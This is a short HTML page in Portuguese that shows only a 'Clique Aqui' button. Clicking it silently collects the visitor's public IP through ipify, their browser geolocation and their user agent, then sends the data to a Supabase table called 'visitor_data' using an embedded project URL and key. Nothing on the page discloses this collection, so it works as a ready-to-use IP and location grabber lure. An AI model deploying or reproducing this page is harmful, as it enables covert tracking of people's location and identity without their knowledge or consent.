<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f0f0f0;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            border: none;
            background-color: #007bff;
            color: white;
            border-radius: 5px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <button id="triggerButton">Clique Aqui</button>

    <script>
        // Configuração do Supabase com suas chaves
        const SUPABASE_URL = 'https://bsbipbftwrwjiepxmbb.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzYmlwYmZ0d3Jyd2ppZXB4bWJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDM4NzczNzQsImV4cCI6MjA1OTQ1MzM3NH0.NB9LBMjPZXF2Z7L78S9-3WhrIKeRyfNvJ-hgVLIKd7g';
        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        // Função para obter o IP do visitante
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Erro ao obter IP:', error);
                return null;
            }
        }

        // Função para obter a localização do visitante
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            });
                        },
                        () => {
                            resolve({ latitude: null, longitude: null });
                        }
                    );
                } else {
                    resolve({ latitude: null, longitude: null });
                }
            });
        }

        // Função principal para capturar e enviar os dados
        async function captureAndSendData() {
            const ip = await getIP();
            const location = await getLocation();
            const userAgent = navigator.userAgent;

            const data = {
                ip: ip,
                latitude: location.latitude,
                longitude: location.longitude,
                user_agent: userAgent
            };

            try {
                const { error } = await supabase
                    .from('visitor_data')
                    .insert([data]);

                if (error) {
                    console.error('Erro ao enviar dados para o Supabase:', error);
                } else {
                    console.log('Dados enviados com sucesso!');
                }
            } catch (error) {
                console.error('Erro geral ao enviar dados:', error);
            }
        }

        // Adiciona o evento de clique ao botão
        document.getElementById('triggerButton').addEventListener('click', captureAndSendData);
    </script>
</body>
</html>
